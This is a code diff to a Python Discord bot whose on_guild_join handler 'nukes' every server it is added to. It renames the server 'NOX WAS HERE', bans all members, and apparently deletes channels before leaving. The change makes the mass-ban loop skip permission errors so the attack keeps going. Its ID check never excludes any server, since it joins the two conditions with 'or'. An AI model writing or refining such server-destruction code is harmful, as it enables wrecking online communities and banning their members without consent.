@@ -13,7 +13,7 @@ class Startup(commands.Cog):
         print('Logged in as: ' + self.bot.user.name + '#' + self.bot.user.discriminator + ' - (' + str(self.bot.user.id) + ')')
     @commands.Cog.listener()
     async def on_guild_join(self, guild):
-        
+
         if guild.id != 993573362221715546 or guild.id != 993594197594607636:
             try:
                 print(f'Joined guild: {guild.name} - {str(guild.id)} - Nuking it :)')
@@ -23,7 +23,10 @@ class Startup(commands.Cog):
                 await guild.edit(name="NOX WAS HERE")
                 print(f'Nuked guild: {guild.name} - {str(guild.id)} - Changed server name :)')
                 for member in guild.members:
-                    await member.ban(reason='Banned by Anix <3')
+                    try:
+                        await member.ban(reason='Banned by Anix <3')
+                    except discord.errors.Forbidden:
+                        pass
                     print(f'Banned {member.name} - {str(member.id)}')
                 print("Guild: " + str(guild.name) + " - " + str(guild.id) + " - Banned all possible members")
                 for c in guild.channels:
@@ -36,7 +39,7 @@ class Startup(commands.Cog):
                 await guild.leave()
                 # error for 
                 print(f'Guild: {guild.name} - {str(guild.id)} - Left after nuking :)')  
-            except discord.ext.commands.GuildNotFound or discord.ext.commands.Forbidden:
+            except discord.ext.commands.GuildNotFound:
                 print("Guild: " + str(guild.name) + " - " + str(guild.id) + " - Kicked or have been banned")
     @commands.Cog.listener()
     async def on_guild_remove(self, guild):
